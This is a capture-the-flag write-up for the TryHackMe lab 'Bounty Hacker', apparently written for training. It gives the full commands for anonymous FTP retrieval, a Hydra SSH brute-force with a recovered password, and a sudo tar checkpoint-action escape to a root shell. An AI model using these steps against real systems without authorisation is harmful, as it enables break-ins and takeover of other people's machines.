# Bounty Hacker - TryHackMe

> **Kill Chain Summary**:
> Network Reconnaissance (Ports 21, 22, 80) -> Anonymous FTP Authentication -> Extraction of `locks.txt` (Password Dictionary) & `task.txt` (User Signature `lin`) -> Targeted SSH Brute-Force with Hydra -> Interactive Shell Access as `lin` -> Sudo Privilege Enumeration (`(root) /bin/tar`) -> GTFOBins Tar Checkpoint Execution -> Root Shell (`root`).

| Property | Value |
| :--- | :--- |
| **Target Name** | Bounty Hacker |
| **Platform** | TryHackMe |
| **OS** | Linux (Ubuntu) |
| **Difficulty** | Easy |
| **Status** | Rooted |
| **Key Techniques** | Anonymous FTP Access, Custom Wordlist Extraction, Hydra SSH Brute-Force, Sudo Tar GTFOBins Privilege Escalation |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was performed using Nmap:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_10.130.160.107 10.130.160.107
```

**Open Ports:**
- **Port 21:** FTP (vsftpd 3.0.5) - Anonymous login allowed.
- **Port 22:** SSH (OpenSSH 8.2p1) - Remote administration.
- **Port 80:** HTTP (Apache httpd 2.4.41) - Cowboy Bebop themed web page.

### 1.2 FTP Enumeration (Port 21)

Connecting to the FTP service with anonymous credentials:

```bash
ftp 10.130.160.107
```

```text
Connected to 10.130.160.107.
220 (vsFTPd 3.0.5)
Name (10.130.160.107:vagrant): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||40123|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000          418 Jun 07  2020 locks.txt
-rw-rw-r--    1 1000     1000           68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> mget *
```

Downloading and analyzing the files:
- `locks.txt`: A targeted wordlist containing candidate passwords.
- `task.txt`: A project task list signed with the author's handle: `-lin`.

---

## 2. Initial Access

### 2.1 Targeted Wordlist Assembly

Inspecting `task.txt` reveals a high-probability system user:
```text
1 I need to write a list of plans for the team.
2 Lin, make sure you protect the site.
-lin
```

A candidate username list (`user.txt`) was compiled incorporating the signature and character references from the web page:
```text
lin
Spike
Jet
Ed
Faye
```

The password list (`locks.txt`) recovered from the FTP service serves as the targeted dictionary.

### 2.2 SSH Credential Brute-Force via Hydra

Using Hydra to test the generated username list against the password dictionary:

```bash
hydra -t 4 -L user.txt -P locks.txt -V 10.130.160.107 ssh
```

```text
[22][ssh] host: 10.130.160.107   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target completed, 1 valid password found
```

Valid credentials identified:
- **Username:** `lin`
- **Password:** `RedDr4gonSynd1cat3`

### 2.3 SSH Authentication

Establish an interactive SSH session:

```bash
ssh lin@10.130.160.107
```

Provide password `RedDr4gonSynd1cat3` when prompted:

```bash
lin@bountyhacker:~$ id
uid=1000(lin) gid=1000(lin) groups=1000(lin)
```

Retrieve the user flag:

```bash
cat /home/lin/user.txt
```

```text
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### 3.1 Local Enumeration: Sudo Privileges

Checking sudo rights for `lin`:

```bash
sudo -l
```

```text
Matching Defaults entries for lin on ip-10-130-160-107:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-130-160-107:
    (root) /bin/tar
```

The user is allowed to execute `/bin/tar` as `root` without restriction.

### 3.2 Exploitation: Sudo Tar GTFOBins Escape

> [!NOTE] Concept: GTFOBins Tar Checkpoint Execution
> The `tar` utility includes checkpoint functionality that allows running arbitrary shell commands at specified record intervals using the flags `--checkpoint=1` and `--checkpoint-action=exec=<command>`. When invoked with `sudo`, the specified action runs with root privileges.

Execute a root shell via `sudo tar`:

```bash
sudo /bin/tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

The shell launches with root privileges:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

Retrieve the root flag:

```bash
cat /root/root.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Download All Files from Anonymous FTP
ftp <TARGET_IP>
Name: anonymous
Password: (enter)
mget *

# Targeted SSH Brute-Force with Custom Lists
hydra -t 4 -L user.txt -P locks.txt -V <TARGET_IP> ssh

# Sudo Tar Privilege Escalation (GTFOBins)
sudo /bin/tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

---

## 5. Key Takeaways and Lessons Learned

1. **Context-Driven Password Lists:** Unauthenticated file storage (FTP, SMB) frequently hosts domain-specific wordlists or project notes. Pairing files like `locks.txt` with usernames discovered in signatures yields rapid brute-force success without large generic dictionaries.
2. **Explicit Binary Elevation:** When exploiting GTFOBins vectors granted via `sudo -l`, always prefix the invocation with `sudo`. Running `/bin/tar` without `sudo` spawns a subshell matching the current user context rather than root.
3. **Restricting Archival Binaries:** Utilities with native command execution flags (`tar`, `zip`, `find`) should never be granted unrestricted sudo access.

---

#tryhackme #linux #easy #ftp #anonymous #hydra #ssh-bruteforce #sudo #gtfobins #tar #privesc
